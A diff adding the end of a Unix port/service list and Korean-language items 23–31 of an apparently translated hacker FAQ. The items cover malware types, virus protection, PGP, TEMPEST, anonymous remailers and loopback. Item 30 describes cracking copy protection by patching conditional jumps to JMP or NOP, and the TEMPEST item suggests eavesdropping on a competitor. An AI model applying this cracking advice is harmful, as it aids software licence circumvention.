+printer         515/tcp    spooler
+printer         515/udp    spooler
+talk            517/tcp    like tenex link, but across
+                           machine - unfortunately, doesn't
+                           use link protocol (this is actually
+                           just a rendezvous port from which a
+                           tcp connection is established)
+talk            517/udp    like tenex link, but across
+                           machine - unfortunately, doesn't
+                           use link protocol (this is actually
+                           just a rendezvous port from which a
+                           tcp connection is established)
+ntalk           518/tcp
+ntalk           518/udp
+utime           519/tcp    unixtime
+utime           519/udp    unixtime
+efs             520/tcp    extended file name server
+router          520/udp    local routing process (on site);
+                           uses variant of Xerox NS routing
+                           information protocol
+timed           525/tcp    timeserver
+timed           525/udp    timeserver
+tempo           526/tcp    newdate
+tempo           526/udp    newdate
+courier         530/tcp    rpc
+courier         530/udp    rpc
+conference      531/tcp    chat
+conference      531/udp    chat
+netnews         532/tcp    readnews
+netnews         532/udp    readnews
+netwall         533/tcp    for emergency broadcasts
+netwall         533/udp    for emergency broadcasts
+uucp            540/tcp    uucpd
+uucp            540/udp    uucpd
+klogin          543/tcp
+klogin          543/udp
+kshell          544/tcp    krcmd
+kshell          544/udp    krcmd
+new-rwho        550/tcp    new-who
+new-rwho        550/udp    new-who
+dsf             555/tcp
+dsf             555/udp
+remotefs        556/tcp    rfs server
+remotefs        556/udp    rfs server
+rmonitor        560/tcp    rmonitord
+rmonitor        560/udp    rmonitord
+monitor         561/tcp
+monitor         561/udp
+chshell         562/tcp    chcmd
+chshell         562/udp    chcmd
+9pfs            564/tcp    plan 9 file service
+9pfs            564/udp    plan 9 file service
+whoami          565/tcp    whoami
+whoami          565/udp    whoami
+meter           570/tcp    demon
+meter           570/udp    demon
+meter           571/tcp    udemon
+meter           571/udp    udemon
+ipcserver       600/tcp    Sun IPC server
+ipcserver       600/udp    Sun IPC server
+nqs             607/tcp    nqs
+nqs             607/udp    nqs
+mdqs            666/tcp
+mdqs            666/udp
+elcsd           704/tcp    errlog copy/server daemon
+elcsd           704/udp    errlog copy/server daemon
+netcp           740/tcp    NETscout Control Protocol
+netcp           740/udp    NETscout Control Protocol
+netgw           741/tcp    netGW
+netgw           741/udp    netGW
+netrcs          742/tcp    Network based Rev. Cont. Sys.
+netrcs          742/udp    Network based Rev. Cont. Sys.
+flexlm          744/tcp    Flexible License Manager
+flexlm          744/udp    Flexible License Manager
+fujitsu-dev     747/tcp    Fujitsu Device Control
+fujitsu-dev     747/udp    Fujitsu Device Control
+ris-cm          748/tcp    Russell Info Sci Calendar Manager
+ris-cm          748/udp    Russell Info Sci Calendar Manager
+kerberos-adm    749/tcp    kerberos administration
+kerberos-adm    749/udp    kerberos administration
+rfile           750/tcp
+loadav          750/udp
+pump            751/tcp
+pump            751/udp
+qrh             752/tcp
+qrh             752/udp
+rrh             753/tcp
+rrh             753/udp
+tell            754/tcp     send
+tell            754/udp     send
+nlogin          758/tcp
+nlogin          758/udp
+con             759/tcp
+con             759/udp
+ns              760/tcp
+ns              760/udp
+rxe             761/tcp
+rxe             761/udp
+quotad          762/tcp
+quotad          762/udp
+cycleserv       763/tcp
+cycleserv       763/udp
+omserv          764/tcp
+omserv          764/udp
+webster         765/tcp
+webster         765/udp
+phonebook       767/tcp    phone
+phonebook       767/udp    phone
+vid             769/tcp
+vid             769/udp
+cadlock         770/tcp
+cadlock         770/udp
+rtip            771/tcp
+rtip            771/udp
+cycleserv2      772/tcp
+cycleserv2      772/udp
+submit          773/tcp
+notify          773/udp
+rpasswd         774/tcp
+acmaint_dbd     774/udp
+entomb          775/tcp
+acmaint_transd  775/udp
+wpages          776/tcp
+wpages          776/udp
+wpgs            780/tcp
+wpgs            780/udp
+hp-collector    781/tcp        hp performance data collector
+hp-collector    781/udp        hp performance data collector
+hp-managed-node 782/tcp        hp performance data managed node
+hp-managed-node 782/udp        hp performance data managed node
+hp-alarm-mgr    783/tcp        hp performance data alarm manager
+hp-alarm-mgr    783/udp        hp performance data alarm manager
+mdbs_daemon     800/tcp
+mdbs_daemon     800/udp
+device          801/tcp
+device          801/udp
+xtreelic        996/tcp        XTREE License Server
+xtreelic        996/udp        XTREE License Server
+maitrd          997/tcp
+maitrd          997/udp
+busboy          998/tcp
+puparp          998/udp
+garcon          999/tcp
+applix          999/udp        Applix ac
+puprouter       999/tcp
+puprouter       999/udp
+cadlock         1000/tcp
+ock             1000/udp
+blackjack       1025/tcp   network blackjack
+blackjack       1025/udp   network blackjack
+hermes          1248/tcp
+hermes          1248/udp
+bbn-mmc         1347/tcp   multi media conferencing
+bbn-mmc         1347/udp   multi media conferencing
+bbn-mmx         1348/tcp   multi media conferencing
+bbn-mmx         1348/udp   multi media conferencing
+sbook           1349/tcp   Registration Network Protocol
+sbook           1349/udp   Registration Network Protocol
+editbench       1350/tcp   Registration Network Protocol
+editbench       1350/udp   Registration Network Protocol
+equationbuilder 1351/tcp   Digital Tool Works (MIT)
+equationbuilder 1351/udp   Digital Tool Works (MIT)
+lotusnote       1352/tcp   Lotus Note
+lotusnote       1352/udp   Lotus Note
+ingreslock      1524/tcp   ingres
+ingreslock      1524/udp   ingres
+orasrv          1525/tcp   oracle
+orasrv          1525/udp   oracle
+prospero-np     1525/tcp   prospero non-privileged
+prospero-np     1525/udp   prospero non-privileged
+tlisrv          1527/tcp   oracle
+tlisrv          1527/udp   oracle
+coauthor        1529/tcp   oracle
+coauthor        1529/udp   oracle
+issd            1600/tcp
+issd            1600/udp
+nkd             1650/tcp
+nkd             1650/udp
+callbook        2000/tcp
+callbook        2000/udp
+dc              2001/tcp
+wizard          2001/udp    curry
+globe           2002/tcp
+globe           2002/udp
+mailbox         2004/tcp
+emce            2004/udp    CCWS mm conf
+berknet         2005/tcp
+oracle          2005/udp
+invokator       2006/tcp
+raid-cc         2006/udp    raid
+dectalk         2007/tcp
+raid-am         2007/udp
+conf            2008/tcp
+terminaldb      2008/udp
+news            2009/tcp
+whosockami      2009/udp
+search          2010/tcp
+pipe_server     2010/udp
+raid-cc         2011/tcp    raid
+servserv        2011/udp
+ttyinfo         2012/tcp
+raid-ac         2012/udp
+raid-am         2013/tcp
+raid-cd         2013/udp
+troff           2014/tcp
+raid-sf         2014/udp
+cypress         2015/tcp
+raid-cs         2015/udp
+bootserver      2016/tcp
+bootserver      2016/udp
+cypress-stat    2017/tcp
+bootclient      2017/udp
+terminaldb      2018/tcp
+rellpack        2018/udp
+whosockami      2019/tcp
+about           2019/udp
+xinupageserver  2020/tcp
+xinupageserver  2020/udp
+servexec        2021/tcp
+xinuexpansion1  2021/udp
+down            2022/tcp
+xinuexpansion2  2022/udp
+xinuexpansion3  2023/tcp
+xinuexpansion3  2023/udp
+xinuexpansion4  2024/tcp
+xinuexpansion4  2024/udp
+ellpack         2025/tcp
+xribs           2025/udp
+scrabble        2026/tcp
+scrabble        2026/udp
+shadowserver    2027/tcp
+shadowserver    2027/udp
+submitserver    2028/tcp
+submitserver    2028/udp
+device2         2030/tcp
+device2         2030/udp
+blackboard      2032/tcp
+blackboard      2032/udp
+glogger         2033/tcp
+glogger         2033/udp
+scoremgr        2034/tcp
+scoremgr        2034/udp
+imsldoc         2035/tcp
+imsldoc         2035/udp
+objectmanager   2038/tcp
+objectmanager   2038/udp
+lam             2040/tcp
+lam             2040/udp
+interbase       2041/tcp
+interbase       2041/udp
+isis            2042/tcp
+isis            2042/udp
+isis-bcast      2043/tcp
+isis-bcast      2043/udp
+rimsl           2044/tcp
+rimsl           2044/udp
+cdfunc          2045/tcp
+cdfunc          2045/udp
+sdfunc          2046/tcp
+sdfunc          2046/udp
+dls             2047/tcp
+dls             2047/udp
+dls-monitor     2048/tcp
+dls-monitor     2048/udp
+shilp           2049/tcp
+shilp           2049/udp
+www-dev         2784/tcp   world wide web - development
+www-dev         2784/udp   world wide web - development
+NSWS            3049/tcp
+NSWS            3049/ddddp
+rfa             4672/tcp   remote file access server
+rfa             4672/udp   remote file access server
+commplex-main   5000/tcp
+commplex-main   5000/udp
+commplex-link   5001/tcp
+commplex-link   5001/udp
+rfe             5002/tcp   radio free ethernet
+rfe             5002/udp   radio free ethernet
+rmonitor_secure 5145/tcp
+rmonitor_secure 5145/udp
+padl2sim        5236/tcp
+padl2sim        5236/udp
+sub-process     6111/tcp   HP SoftBench Sub-Process Control
+sub-process     6111/udp   HP SoftBench Sub-Process Control
+xdsxdm          6558/udp
+xdsxdm          6558/tcp
+afs3-fileserver 7000/tcp   file server itself
+afs3-fileserver 7000/udp   file server itself
+afs3-callback   7001/tcp   callbacks to cache managers
+afs3-callback   7001/udp   callbacks to cache managers
+afs3-prserver   7002/tcp   users & groups database
+afs3-prserver   7002/udp   users & groups database
+afs3-vlserver   7003/tcp   volume location database
+afs3-vlserver   7003/udp   volume location database
+afs3-kaserver   7004/tcp   AFS/Kerberos authentication service
+afs3-kaserver   7004/udp   AFS/Kerberos authentication service
+afs3-volser     7005/tcp   volume managment server
+afs3-volser     7005/udp   volume managment server
+afs3-errors     7006/tcp   error interpretation service
+afs3-errors     7006/udp   error interpretation service
+afs3-bos        7007/tcp   basic overseer process
+afs3-bos        7007/udp   basic overseer process
+afs3-update     7008/tcp   server-to-server updater
+afs3-update     7008/udp   server-to-server updater
+afs3-rmtsys     7009/tcp   remote cache manager service
+afs3-rmtsys     7009/udp   remote cache manager service
+man             9535/tcp
+man             9535/udp
+isode-dua       17007/tcp
+isode-dua       17007/udp
+
+23.트로이목마,웜,바이러스,로그bomb는 무엇인가?
+TROJAN  유용한 기능을 하는 프로그램처럼 보이지만 내부적으로는  또 다른 프로그램이 숨어있
+는 프로그램을 의미한다. 사용자가 이 프로그램을 사용할 경우,트로이의 목마는 비밀리에 또 다른
+숨겨진 기능을 수행한다.(예를 들어 사용자의 권한을 증가시키는 기능 등)
+VIRUS    이것은 독립적인 프로그램이 아니라 프로그램에 붙어있는 일종의 코드이다. 여러 개의
+프로그램으로 감염이 되어 자료르 파괴하거나,시스템의 성능을 저하시킨다.
+WORM     네트워크에 연결되어 있는 여러 시스템을  감염시킴으로써,바이러스처럼 자료를 파괴
+하거나,시스템의 성능을  저하시키는 독립적인 프로그램이다.심지어는  시스템을 부팅시키기도 한
+다.
+LOGIC BOMB 시스템을  파괴하는 다양한 종류의 방법을  의미한다. 특별한 조건(어떤 날자라든
+지,특별한 기능이 수행될 때)이 만족되면 시스템 파괴가 수행된다.(포맷이나 데이타 삭제 등등)
+
+24.바이러스로부터 어떻게 나자신을 지킬것인가?
+플로피 디스켓의 경우,쓰기 기능이 필요 없을 때는 항상 쓰기 방지 기능을 사용한다.
+실행 파일의 경우(파일 확장자가  COM이나 EXE),파일 속성을 읽기 전용으로 설정해  놓는다. 엉
+성하게 만들어진 바이러스부터 파일을 보호할 수 있지만 충분한  방법은 아니다. 최신의 바이러스
+백신을 이용하여 자료를 항상 검색한다. 주기적으로 백업을 한다.
+
+25.Cryptoxxxxxxx란 무엇인가?
+일반적인 메세지는 plaintext나 cleartext라고 한다. 이런 메세지의 내용을 보지 못하도록 암호화하
+는 방법을 encryption이라고 하며,이렇게 암호화된 메세지는  ciphertext라고 불리운다.ciphertext를
+원래의 plaintext로 되돌리는 방법은 decryption이라고 한다. 메세지를 보호하는 방법은 여러 가지
+가 있으며,그런 방법들을 총칭하여 cryptography라고 한다.
+
+26.PGP란 무엇인가?
+PGP SMS e-mail과 자료 파일을 보호하기 위하여 public-key encryption을 사용하므로,사전에 키
+룰 교환할 필요 없이 안전한 채널을 통해 처음보는 사람과도  통신을 할 수 가있다.PGP는 복잡한
+키관리,패스워드,자료압축이 가능하며 인간공학적으로 설계되어 있다.
+Phil's Pretty Good Software에서 개발한 Pretty Good(tm) Privacy (PGP)는
+MS-DOS, Unix,VAX/VMS, 이외의 여러시스템을 위한 고도의 암호화 응용 프로그램이다.
+PGP를 사용하여 파일이나 메세지를 교환하는 경우,자료의 보안을 위하여 세가지의 특징을 사용한
+다.
+1.메세지를 수신하는 사람 외에는 내용을 볼 수 없다.
+2.메세지에 적혀 있는 보내는 사람 이름이 정확히 송신인과 일치해야 한다.
+즉 다른 사람 이름으로는 메세지를 보낼 수가 없다.
+3.위의 두가지 특징이 프로그램에 연결된 키의 충돌없이 편리하게 제공된다. 안전한 채널을 위해
+서 사용자들 사이에 키를 교환할 필요는 없으므로 사용이 매우 편리하다.
+이것은 PGP가 'public  key cryptography'라고 불리유눈 새롭고  강력한 기술을 사용하기 때문에
+가능하다.
+
+27.템페스트란 무엇인가?
+Tempest는 Transient Electromagnetic Pulse Surveillance Technology를 의미한다.
+컴퓨터와 같은 전자 장비는 주변에 전자파를 방출한다. 이것은 두개의 모니터를 가까이 위치시킴
+으로써 쉽게 확인할 수가 있다. 모니터를 멀리 분리시켜놓을 때까지 화면이 불규칙하게 나타나는
+것을 볼 수가 있다.
+대부분의 경우 이런 전자파는 아주 안 좋은 것이지만 가끔은 유용한 경우가 있다.
+경쟁회사에서 어떤 프로젝트가 진행중인가 알기 원한다고 가정하자.
+사무실 밖에 있는 자동차에서 사무실 내에 있는 모니터에서 나오는 전자파를 잡아 해독하는 전자
+장비를 사용할 수 있을 것이다. 그러나 경쟁회사는 모니터에서 나오는 전자차를 차단하거나 전자
+파가 발생하지 않는 장비를 사용할수도 있다.
+TEMPEST는 도청으로부터 안전한 전자 장비의 평가와 보증을 위한 미정부 프로그램이다.
+
+28.익명의 편지를 보내자.
+anonymous remailer란 익명으로 e-mail을 보내거나 usenet에 메세지를 발송하게 해주는 인터넷상
+의 시스템을 말한다.
+remailer site에서 익명의 계좌를 통해  메세지를 발송하면, 그 메세지를 읽은 어느 누구도 발신
+인의 실제 아이디와 host명을 알 수가 없는 것이다.
+
+29.Anonymouse remailer의 주소는?
+가장 일반적이고  안정적인 anonymous remailer는 johan  Helsingus가 운영하는 anon.penet.fi이
+다.  익명의  ID를  얻으려면  ping@anon.penet.fi로  메일을 보내면  된다.  우리가  anonymous
+REMAILER의 목록을 보려고 한다면,FINGER명령을 이용하여
+remailer-list@kiwi.cs.berkeley.edu를 검색하면 된다.
+
+30.어떻게 복사 방지장치를 깨뜨릴것인가?
+복사방지장치를 깨뜨리는 두가지 방법이 있는데,첫번째는 복사 방지 장치를 제거하는 프로그램을
+사용하는 것이다. 이런 목적으로 만들어진 프로그램에는
+Central Point Software사에서 개발한 CopyIIPC와 Quaid software에서 나온 copy write가 있다.
+두번째 방법은 복사 방지된 프로그램을 직접 패치하는 것이다.
+많이 알려진  프로그램의 경우  패치 메뉴얼을  쉽게 구할 수가  있으며,debug나 노턴유틸리티의
+diskedit를 이용하여 패치할 수 있다. 그렇지  않을 경우는 자신이 직접 패치해야 한다. 물론 쉽
+지가 않을 것이다. 어셈블리에 관한  지식을 가지고 있다면 debugger나 sourcer와 같은 역어셈블
+링 프로그램을 이용하여 직접 패치를 할 수가 있다. 디버거와 함게 복사 방지된 프로그램을 실행
+시켜서 복사 방지 메카니즘을 살피도록  한다. 대략적인 복사 방지 메카니즘이 파악이 되면 코드
+를 변경한다.
+JE (Jump on Equal) 이나 JNE (Jump  On Not Equal) 와 같은 코드를 JMP (Jump Unconditionally)
+로 바꾸거나 NOP (No Operation) 으로 바꿔보는 것이 좋다.
+
+31.127.0.0.1는 무엇인가?
+127.0.0.1은 loopback network  connection이다. 즉 telnet이나 ftp를 이용하여 이곳에  접속하면 자
+기 자신에게 접속하게 되는 것이다.
+
+
+
+
